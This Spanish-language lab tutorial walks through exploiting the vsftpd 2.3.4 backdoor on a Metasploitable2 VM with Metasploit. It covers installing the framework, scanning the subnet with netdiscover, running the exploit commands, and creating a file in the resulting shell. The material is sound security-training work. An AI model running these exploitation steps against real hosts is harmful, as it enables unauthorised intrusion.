# Explotando vulnerabilidad de puerto ftp
***
## Primeros pasos
Es pertinente tener instalado el framework de metasploit en tu sistema Linux:

`curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall`

Una vez finalizado, ejecute el comando:

`msfconsole`

![image](https://github.com/user-attachments/assets/7be3f2b1-4d50-47c0-8fb2-28857e5f68a6)

También es necesario tener lista una máquina virtual de Linux(Otro Linux) 
y que se le intercambie su disco virtual por el de Metasploitable2. El resultado
es el siguiente:

![image](https://github.com/user-attachments/assets/3459aa0d-654a-469b-9bb7-f269d1cb380b)

El sistema esta listo para la prueba.
***
## Ejecutando la prueba

Haciendo un rápido escaneo con el siguiente comando:

`sudo netdiscover -r 192.168.1.0/24`

se tiene lo siguiente:

![image](https://github.com/user-attachments/assets/7fbb6ef3-b07e-4734-bee4-f11d9fb9398c)

En este caso, nuestra querida Metasploitable2 tiene la dirección IP 192.168.1.169
Haciendo un escaneo de esa dirección en particular podemos ver los detalles y confirmar
la identidad de esa máquina.

![image](https://github.com/user-attachments/assets/19eac865-e541-4d3a-bc15-88d64c6902f4)

![image](https://github.com/user-attachments/assets/0f5c881f-1355-40ce-b281-3446b3be730a)

La consola nos marca que el puerto 21 con servicio ftp está activo.
***
Desde nuestra otra máquina abrimos la consola de metasploitable y buscamos con la clave
`vsftpd`:

![image](https://github.com/user-attachments/assets/61da988e-636a-44ef-ba5e-b3330e5fe191)

Este es un script que inicia un backdoor mdiante el puerto ftp que se mencionó anteriormente. Escribimos:

`use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.169
exploit`


![image](https://github.com/user-attachments/assets/56c1f90b-3a8e-4aa0-9b9d-1a1203ae7097)

Nos da un mensaje de `Found Shell` y el exploit se a completado. Al principio no parece
pero en este punto podemos hacer lo que queramos en este sistema. Aquí se muestra como se crea un archivo y se puede visualizar desde la máquina virtual
del metasploitable:


![image](https://github.com/user-attachments/assets/97ba70d8-8078-4ad2-bfad-90354ab3f340)


![image](https://github.com/user-attachments/assets/f323a35c-d80d-46eb-ac23-5657718bc9ad)
